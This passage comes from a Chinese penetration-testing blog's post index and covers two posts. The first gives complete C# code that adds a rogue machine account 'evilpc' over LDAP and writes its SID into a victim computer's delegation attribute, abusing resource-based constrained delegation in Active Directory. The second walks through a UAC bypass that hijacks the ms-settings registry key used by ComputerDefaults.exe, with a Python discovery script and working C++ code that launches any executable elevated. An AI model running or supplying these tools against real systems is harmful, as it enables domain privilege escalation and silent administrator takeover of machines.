src="/img/delegation/9e65d224-9857-4dd9-8d0a-787b96e3c5c1.png" alt="img"></p><p>添加对activedirecty操作的dll的引用</p><p><img src="/img/delegation/7b03aad5-a2d9-4619-8a80-412624cad08a.png" alt="img"></p><p>第十九行需要改一下，将DC=hack,DC=local改为内网对应的域</p><pre><code>using System;using System.Text;using System.Security.AccessControl;using System.Security.Principal;using System.Net;namespace Addnew_MachineAccount{    class Program    {        static void Main(string[] args)        {            String DomainController = args[0];  // 域控IP            String Domain = args[1];   // hack.local            String username = args[2]; //域用户名            String password = args[3]; //域用户密码            String victimcomputer = args[4]; //需要进行提权的机器            String new_MachineAccount = &quot;evilpc&quot;; //添加的机器账户            String new_MachineAccount_password = &quot;123456&quot;; //机器账户密码            String victimcomputer_ldap_path = &quot;LDAP://CN=&quot; + victimcomputer + &quot;, CN=Computers,DC=hack,DC=local&quot;; // 这里也需要改            String machine_account = new_MachineAccount;            String sam_account = machine_account + &quot;$&quot;;            String distinguished_name = &quot;&quot;;            String[] DC_array = null;            distinguished_name = &quot;CN=&quot; + machine_account + &quot;,CN=Computers&quot;;            DC_array = Domain.Split(&#39;.&#39;);            foreach (String DC in DC_array)            {                distinguished_name += &quot;,DC=&quot; + DC;            }            Console.WriteLine(&quot;[+] Elevate permissions on &quot; + victimcomputer);            Console.WriteLine(&quot;[+] Domain = &quot; + Domain);            Console.WriteLine(&quot;[+] Domain Controller = &quot; + DomainController);            //Console.WriteLine(&quot;[+] New SAMAccountName = &quot; + sam_account);            //Console.WriteLine(&quot;[+] Distinguished Name = &quot; + distinguished_name);            //连接ldap            System.DirectoryServices.Protocols.LdapDirectoryIdentifier identifier = new System.DirectoryServices.Protocols.LdapDirectoryIdentifier(DomainController, 389);            NetworkCredential nc = new NetworkCredential(username, password); //使用凭据登录            System.DirectoryServices.Protocols.LdapConnection connection = null;            connection = new System.DirectoryServices.Protocols.LdapConnection(identifier, nc);            //connection = new System.DirectoryServices.Protocols.LdapConnection(identifier);            connection.SessionOptions.Sealing = true;            connection.SessionOptions.Signing = true;            connection.Bind();            var request = new System.DirectoryServices.Protocols.AddRequest(distinguished_name, new System.DirectoryServices.Protocols.DirectoryAttribute[] {                new System.DirectoryServices.Protocols.DirectoryAttribute(&quot;DnsHostName&quot;, machine_account +&quot;.&quot;+ Domain),                new System.DirectoryServices.Protocols.DirectoryAttribute(&quot;SamAccountName&quot;, sam_account),                new System.DirectoryServices.Protocols.DirectoryAttribute(&quot;userAccountControl&quot;, &quot;4096&quot;),                new System.DirectoryServices.Protocols.DirectoryAttribute(&quot;unicodePwd&quot;, Encoding.Unicode.GetBytes(&quot;\&quot;&quot; + new_MachineAccount_password + &quot;\&quot;&quot;)),                new System.DirectoryServices.Protocols.DirectoryAttribute(&quot;objectClass&quot;, &quot;Computer&quot;),                new System.DirectoryServices.Protocols.DirectoryAttribute(&quot;ServicePrincipalName&quot;, &quot;HOST/&quot;+machine_account+&quot;.&quot;+Domain,&quot;RestrictedKrbHost/&quot;+machine_account+&quot;.&quot;+Domain,&quot;HOST/&quot;+machine_account,&quot;RestrictedKrbHost/&quot;+machine_account)            });            try            {                //添加机器账户                connection.SendRequest(request);                Console.WriteLine(&quot;[+] Machine account: &quot; + machine_account + &quot; Password: &quot; + new_MachineAccount_password + &quot; added&quot;);            }            catch (System.Exception ex)            {                Console.WriteLine(&quot;[-] The new machine could not be created! User may have reached ms-DS-new_MachineAccountQuota limit.)&quot;);                Console.WriteLine(&quot;[-] Exception: &quot; + ex.Message);                return;            }            // 获取新计算机对象的SID            var new_request = new System.DirectoryServices.Protocols.SearchRequest(distinguished_name, &quot;(&amp;(samAccountType=805306369)(|(name=&quot; + machine_account + &quot;)))&quot;, System.DirectoryServices.Protocols.SearchScope.Subtree, null);            var new_response = (System.DirectoryServices.Protocols.SearchResponse)connection.SendRequest(new_request);            SecurityIdentifier sid = null;            foreach (System.DirectoryServices.Protocols.SearchResultEntry entry in new_response.Entries)            {                try                {                    sid = new SecurityIdentifier(entry.Attributes[&quot;objectsid&quot;][0] as byte[], 0);                    Console.Out.WriteLine(&quot;[+] &quot; + new_MachineAccount + &quot; SID : &quot; + sid.Value);                }                catch                {                    Console.WriteLine(&quot;[!] It was not possible to retrieve the SID.\nExiting...&quot;);                    return;                }            }            //设置资源约束委派            //System.DirectoryServices.DirectoryEntry myldapConnection = new System.DirectoryServices.DirectoryEntry(&quot;domain.com.cn&quot;);            System.DirectoryServices.DirectoryEntry myldapConnection = new System.DirectoryServices.DirectoryEntry(Domain, username, password);            myldapConnection.Path = victimcomputer_ldap_path;            myldapConnection.AuthenticationType = System.DirectoryServices.AuthenticationTypes.Secure;            System.DirectoryServices.DirectorySearcher search = new System.DirectoryServices.DirectorySearcher(myldapConnection);            //通过ldap找计算机            search.Filter = &quot;(CN=&quot; + victimcomputer + &quot;)&quot;;            string[] requiredProperties = new string[] { &quot;samaccountname&quot; };            foreach (String property in requiredProperties)                search.PropertiesToLoad.Add(property);            System.DirectoryServices.SearchResult result = null;            try            {                result = search.FindOne();            }            catch (System.Exception ex)            {                Console.WriteLine(ex.Message + &quot;Exiting...&quot;);                return;            }            if (result != null)            {                System.DirectoryServices.DirectoryEntry entryToUpdate = result.GetDirectoryEntry();                String sec_descriptor = &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;&quot; + sid.Value + &quot;)&quot;;                System.Security.AccessControl.RawSecurityDescriptor sd = new RawSecurityDescriptor(sec_descriptor);                byte[] descriptor_buffer = new byte[sd.BinaryLength];                sd.GetBinaryForm(descriptor_buffer, 0);                // 添加evilpc的sid到msds-allowedtoactonbehalfofotheridentity中                entryToUpdate.Properties[&quot;msds-allowedtoactonbehalfofotheridentity&quot;].Value = descriptor_buffer;                try                {                    entryToUpdate.CommitChanges();//提交更改                    Console.WriteLine(&quot;[+] Exploit successfully!&quot;);                }                catch (System.Exception ex)                {                    Console.WriteLine(ex.Message);                    Console.WriteLine(&quot;[!] \nFailed...&quot;);                    return;                }            }        }    }}</code></pre><h2 id="0x05-视频演示"><a href="#0x05-视频演示" class="headerlink" title="0x05 视频演示"></a>0x05 视频演示</h2><p><img src="/img/delegation/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8.gif" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 域渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基于资源的约束委派利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于白名单注册表bypassUAC</title>
      <link href="/2020/11/25/regeditbypassuac/"/>
      <url>/2020/11/25/regeditbypassuac/</url>
      
        <content type="html"><![CDATA[<h1 id="基于白名单注册表bypassUAC"><a href="#基于白名单注册表bypassUAC" class="headerlink" title="基于白名单注册表bypassUAC"></a>基于白名单注册表bypassUAC</h1><h2 id="0x01-概念"><a href="#0x01-概念" class="headerlink" title="0x01 概念"></a>0x01 概念</h2><p>用户帐户控制（User Account Control，简写作UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序（有时也称为“恶意软件”）损坏系统的效果。</p><p>当前用户是管理员权限，但是有些exe会弹出用户账户控制，如果点击否的话，就会出现拒绝访问，那么也就没有成功运行该程序了。这样就会影响后续的内网渗透，例如取密码等，所以我们需要bypassuac。</p><p><img src="/img/regeditBypassUAC/1.jpg" alt></p><p><img src="/img/regeditBypassUAC/2.jpg" alt></p><p>手动bypassuac，右键以管理员身份运行，但是显然这个是不现实的</p><p><img src="/img/regeditBypassUAC/3.jpg" alt></p><h2 id="0x02-发掘bypassUAC的程序"><a href="#0x02-发掘bypassUAC的程序" class="headerlink" title="0x02 发掘bypassUAC的程序"></a>0x02 发掘bypassUAC的程序</h2><p>有一些系统程序是会直接获取管理员权限同时不弹出UAC弹窗，这类程序被称为白名单程序。 这些程序拥有autoElevate属性的值为True，会在启动时就静默提升权限。</p><pre><code>1. 程序的manifest标识的配置属性 autoElevate为true2. 程序不弹出UAC弹窗3. 从注册表里查询Shell\Open\command键值对</code></pre><h3 id="0x02-1-寻找autoElevate为true的程序"><a href="#0x02-1-寻找autoElevate为true的程序" class="headerlink" title="0x02-1 寻找autoElevate为true的程序"></a>0x02-1 寻找autoElevate为true的程序</h3><p><img src="/img/regeditBypassUAC/4.jpg" alt></p><p>这里写了个py脚本遍历c:\windows\system32\目录下的所有exe文件，寻找autoElevate为true的exe程序</p><pre><code>import osfrom subprocess import *# path = r&#39;C:\Users\bingdu\Desktop\bypassUAC&#39;path = &#39;c:\windows\system32&#39;files = os.listdir(path)print(files)def GetFileList(path, fileList):    newDir = path    if os.path.isfile(path):        if path[-4:] == &#39;.exe&#39;:            fileList.append(path)    elif os.path.isdir(path):        try:            for s in os.listdir(path):                newDir=os.path.join(path,s)                GetFileList(newDir, fileList)        except Exception as e:            pass    return fileListfiles = GetFileList(path, [])      print(files)for eachFile in files:    if eachFile[-4:] == &#39;.exe&#39;:        command = r&#39;.\sigcheck64.exe -m {} | findstr auto&#39;.format(eachFile)        print(command)        p1 = Popen(command, shell=True, stdin=PIPE, stdout=PIPE)        if &#39;&lt;autoElevate&gt;true&lt;/autoElevate&gt;&#39; in p1.stdout.read().decode(&#39;gb2312&#39;):            copy_command = r&#39;copy {} .\success&#39;.format(eachFile)            Popen(copy_command, shell=True, stdin=PIPE, stdout=PIPE)            print(&#39;[+] {}&#39;.format(eachFile))            with open(&#39;success.txt&#39;, &#39;at&#39;) as f:                f.writelines(&#39;{}\n&#39;.format(eachFile))</code></pre><p><img src="/img/regeditBypassUAC/5.jpg" alt></p><p>结果如下：</p><pre><code>c:\windows\system32\bthudtask.exec:\windows\system32\changepk.exec:\windows\system32\ComputerDefaults.exec:\windows\system32\dccw.exec:\windows\system32\dcomcnfg.exec:\windows\system32\DeviceEject.exec:\windows\system32\DeviceProperties.exec:\windows\system32\djoin.exec:\windows\system32\easinvoker.exec:\windows\system32\EASPolicyManagerBrokerHost.exec:\windows\system32\eudcedit.exec:\windows\system32\eventvwr.exec:\windows\system32\fodhelper.exec:\windows\system32\fsquirt.exec:\windows\system32\FXSUNATD.exec:\windows\system32\immersivetpmvscmgrsvr.exec:\windows\system32\iscsicli.exec:\windows\system32\iscsicpl.exec:\windows\system32\lpksetup.exec:\windows\system32\MSchedExe.exec:\windows\system32\msconfig.exec:\windows\system32\msra.exec:\windows\system32\MultiDigiMon.exec:\windows\system32\newdev.exec:\windows\system32\odbcad32.exec:\windows\system32\PasswordOnWakeSettingFlyout.exec:\windows\system32\pwcreator.exec:\windows\system32\rdpshell.exec:\windows\system32\recdisc.exec:\windows\system32\rrinstaller.exec:\windows\system32\shrpubw.exec:\windows\system32\slui.exec:\windows\system32\Sysprep\sysprep.exec:\windows\system32\SystemPropertiesAdvanced.exec:\windows\system32\SystemPropertiesComputerName.exec:\windows\system32\SystemPropertiesDataExecutionPrevention.exec:\windows\system32\SystemPropertiesHardware.exec:\windows\system32\SystemPropertiesPerformance.exec:\windows\system32\SystemPropertiesProtection.exec:\windows\system32\SystemPropertiesRemote.exec:\windows\system32\SystemSettingsAdminFlows.exec:\windows\system32\SystemSettingsRemoveDevice.exec:\windows\system32\Taskmgr.exec:\windows\system32\tcmsetup.exec:\windows\system32\TpmInit.exec:\windows\system32\WindowsUpdateElevatedInstaller.exec:\windows\system32\WSReset.exec:\windows\system32\wusa.exe</code></pre><h3 id="0x02-2-寻找不弹UAC框的程序"><a href="#0x02-2-寻找不弹UAC框的程序" class="headerlink" title="0x02-2 寻找不弹UAC框的程序"></a>0x02-2 寻找不弹UAC框的程序</h3><p>在cmd一个个的去运行exe，如果不弹uac框就运行的既是</p><p>结果如下，下面只是找的前面几个，后面的没有去测试</p><pre><code>c:\windows\system32\bthudtask.exe                       okc:\windows\system32\changepk.exec:\windows\system32\ComputerDefaults.exe                ok      1c:\windows\system32\dccw.exe                            ok      1c:\windows\system32\dcomcnfg.exe                        ok      1c:\windows\system32\DeviceEject.exe                     ok  c:\windows\system32\DeviceProperties.exe                okc:\windows\system32\djoin.exe                           okc:\windows\system32\easinvoker.exe                      okc:\windows\system32\EASPolicyManagerBrokerHost.exe      okc:\windows\system32\eudcedit.exe                        ok      1c:\windows\system32\eventvwr.exe                        ok      1c:\windows\system32\fodhelper.exe                       ok      1c:\windows\system32\fsquirt.exe                         ok      1c:\windows\system32\FXSUNATD.exe                        okc:\windows\system32\immersivetpmvscmgrsvr.exe           okc:\windows\system32\iscsicli.exe                        ok      1c:\windows\system32\iscsicpl.exe                        ok      1</code></pre><h3 id="0x02-3-从注册表里查询Shell-Open-command键值对"><a href="#0x02-3-从注册表里查询Shell-Open-command键值对" class="headerlink" title="0x02-3 从注册表里查询Shell\Open\command键值对"></a>0x02-3 从注册表里查询Shell\Open\command键值对</h3><p>通常以shell\open\command命名的键值对存储的是可执行文件的路径，如果exe程序运行的时候找到该键值对，就会运行该键值对的程序，而因为exe运行的时候是静默提升了权限，所以运行的该键值对的程序就已经过了uac。</p><p>所以我们把恶意的exe路径写入该键值对，那么就能够过uac执行我们的恶意exe。</p><p>使用Procmon监听，运行0x02-2的结果</p><p>这里以c:\windows\system32\ComputerDefaults.exe测试</p><p>过滤条件如下</p><p><img src="/img/regeditBypassUAC/6.jpg" alt></p><p>会去查询HKCU:\Software\Classes\ms-settings\shell\open\command</p><p><img src="/img/regeditBypassUAC/7.jpg" alt></p><p>然后我们再注册表里创建该键值对</p><p><img src="/img/regeditBypassUAC/8.jpg" alt><br>继续监听，重新运行c:\windows\system32\ComputerDefaults.exe，发现还查询了HKCU\Software\Classes\ms-settings\shell\open\command\DelegateExecute的键值对</p><p><img src="/img/regeditBypassUAC/9.jpg" alt></p><p>在注册表里创建HKCU\Software\Classes\ms-settings\shell\open\command\DelegateExecute</p><p><img src="/img/regeditBypassUAC/10.jpg" alt></p><p>继续监听，重新运行c:\windows\system32\ComputerDefaults.exe，这时候采取获取Software\Classes\ms-settings\shell\open\command的默认值，然后就会运行该值的程序</p><p><img src="/img/regeditBypassUAC/11.jpg" alt></p><h3 id="0x02-4-总结"><a href="#0x02-4-总结" class="headerlink" title="0x02-4 总结"></a>0x02-4 总结</h3><p>如果键值对HKCU:\Software\Classes\ms-settings\shell\open\command存在，ComputerDefaults会接下去查找HKCU:\Software\Classes\ms-settings\shell\open\command\DelegateExecute是否也存在,若也存在到则读取HKCU:\Software\Classes\ms-settings\shell\open\command的值然后执行。</p><p>测试：将HKCU:\Software\Classes\ms-settings\shell\open\command(default)的值设置为cmd.exe，然后运行c:\windows\system32\ComputerDefaults.exe</p><p><img src="/img/regeditBypassUAC/12.jpg" alt></p><p>成功弹出exe，并且是过了uac的权限</p><p><img src="/img/regeditBypassUAC/13.jpg" alt></p><h2 id="0x03-C-代码实现运行任意exe过uac"><a href="#0x03-C-代码实现运行任意exe过uac" class="headerlink" title="0x03 C++代码实现运行任意exe过uac"></a>0x03 C++代码实现运行任意exe过uac</h2><pre><code>#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;int wmain(int argc, wchar_t* argv[]) {    if (argc != 2) {        wprintf(L&quot;Usage: %s &lt;filePath&gt;\n&quot;, argv[0]);        wprintf(L&quot;       %s cmd.exe\n&quot;, argv[0]);        exit(1);    }    LPWSTR filePath = argv[1];    PROCESS_INFORMATION pi = { 0 };    STARTUPINFOA si = { 0 };    HKEY hKey;    si.cb = sizeof(STARTUPINFO);    si.wShowWindow = SW_HIDE;    RegCreateKeyW(HKEY_CURRENT_USER, L&quot;Software\\Classes\\ms-settings\\Shell\\open\\command&quot;, &amp;hKey);       // 创建注册表项    RegSetValueExW(hKey, L&quot;&quot;, 0, REG_SZ, (LPBYTE)filePath, lstrlenW(filePath));                             // 赋值，执行的exe路径    RegSetValueExW(hKey, L&quot;DelegateExecute&quot;, 0, REG_SZ, (LPBYTE)&quot;&quot;, sizeof(&quot;&quot;));    // 创建进程ComputerDefaults    CreateProcessA(&quot;C:\\Windows\\System32\\cmd.exe&quot;, (LPSTR)&quot;/c C:\\Windows\\System32\\ComputerDefaults.exe&quot;, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &amp;si, &amp;pi);    // 延时十秒，等ComputerDefaults.exe运行    Sleep(10000);    // 清楚注册表项    RegDeleteTreeA(HKEY_CURRENT_USER, &quot;Software\\Classes\\ms-settings&quot;);    return 0;}</code></pre><p>效果：</p><p><img src="/img/regeditBypassUAC/14.jpg" alt></p><h2 id="视频演示"><a href="#视频演示" class="headerlink" title="视频演示"></a>视频演示</h2><p><img src="/img/regeditBypassUAC/regeditBypassUAC.gif" alt></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://idiotc4t.com/privilege-escalation/bypassuac-fodhelper" target="_blank" rel="noopener">https://idiotc4t.com/privilege-escalation/bypassuac-fodhelper</a></p>]]></content>
      
      
      <categories>
          
          <category> BypassUAC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BypassUAC </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
